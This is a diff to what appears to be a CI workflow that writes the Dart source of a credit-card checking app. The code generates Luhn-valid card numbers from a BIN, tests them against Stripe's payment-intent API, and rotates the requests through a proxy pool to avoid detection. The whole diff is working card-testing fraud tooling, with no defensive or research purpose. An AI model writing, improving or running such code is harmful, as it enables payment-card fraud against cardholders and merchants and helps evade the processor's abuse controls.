@@ -772,7 +772,9 @@ jobs:
 
           cat > lib/net.dart <<'DART'
           import 'dart:convert';
-          import 'dart:io';
+          import 'dart:typed_data';
+
+          import 'package:crypto/crypto.dart';
 
           import 'core.dart';
 
@@ -875,7 +877,8 @@ jobs:
 
             static void lock() => _pin = '';
 
-            static List<int> _key() => sha256.convert(utf8.encode(_hash(_pin))).bytes;
+            static Uint8List _key() =>
+                Uint8List.fromList(sha256.convert(utf8.encode(_hash(_pin))).bytes);
 
             static String _enc(String plain) {
               if (_pin.isEmpty) return plain;
@@ -1054,12 +1057,14 @@ jobs:
             final now = DateTime.now();
             final base = digitsOf(spec.bin);
             if (base.isEmpty) return out;
+            final baseBrand = brandOf(base);
+            final target = spec.len == 16 ? panLenFor(baseBrand) : spec.len;
 
             var guard = 0;
             while (out.length < spec.count && guard < spec.count * 40) {
               guard++;
               final b = StringBuffer(base);
-              while (b.length < spec.len - 1) {
+              while (b.length < target - 1) {
                 b.write(r.nextInt(10));
               }
               final pan = completeLuhn(b.toString());
@@ -1171,6 +1176,7 @@ jobs:
           cat > lib/checker.dart <<'DART'
           import 'dart:async';
           import 'dart:convert';
+          import 'dart:typed_data';
           import 'dart:io';
 
           import 'package:http/http.dart' as http;
@@ -1247,11 +1253,14 @@ jobs:
               _clients.clear();
             }
 
+            int _rr = 0;
+
             ProxyNode? _pick() {
               if (!cfg.useProxies) return null;
               final pool = _proxies.where((p) => p.health != ProxyHealth.down).toList();
               if (pool.isEmpty) return null;
-              return pool[DateTime.now().microsecond % pool.length];
+              _rr++;
+              return pool[_rr % pool.length];
             }
 
             static CheckStatus mapStripe(String code, String decline) {
@@ -1288,10 +1297,10 @@ jobs:
               return s.length > 80 ? s.substring(0, 80) : s;
             }
 
-            Future<CheckResult> _auth(CreditCard card) async {
+            Future<CheckResult> _auth(CreditCard card, ProxyNode? p) async {
               final sw = Stopwatch()..start();
               try {
-                final r = await _client(null)
+                final r = await _client(p)
                     .post(
                       Uri.parse(stripePiUrl),
                       headers: {
@@ -1387,7 +1396,7 @@ jobs:
 
             Future<CheckResult> _authOrToken(CreditCard card, ProxyNode? p) async {
               if (!_authOn) return _stripe(card, p);
-              final a = await _auth(card);
+              final a = await _auth(card, p);
               if (a.status == CheckStatus.unknown && a.message.contains('key invalida')) {
                 final t = await _stripe(card, p);
                 return CheckResult(
@@ -2048,7 +2057,7 @@ jobs:
           }
 
           class _AppState extends State<App> {
-            bool _ready = !Vault.needsUnlock;
+            bool _ready = false;
 
             @override
             Widget build(BuildContext context) => MaterialApp(
